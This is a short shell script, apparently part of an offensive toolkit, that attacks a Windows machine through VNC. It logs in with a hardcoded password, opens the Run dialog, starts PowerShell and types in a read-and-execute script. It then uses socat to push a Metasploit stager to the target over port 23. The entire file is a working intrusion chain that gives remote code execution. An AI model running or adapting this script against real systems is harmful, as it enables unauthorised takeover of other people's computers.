#!/bin/sh

vncdo -s $1 -p password \
	pause 2 \
	key alt-r \
	pause 2 \
	type "powershell" \
	key enter \
	pause 2 \
	typefile win/USaBuse_PS/USaBuse_PS/read_exec.ps1 && \
	socat TCP:$1:23 EXEC:"./stage.sh win/USaBuse_PS/USaBuse_PS/msfstage_proxy.ps1"
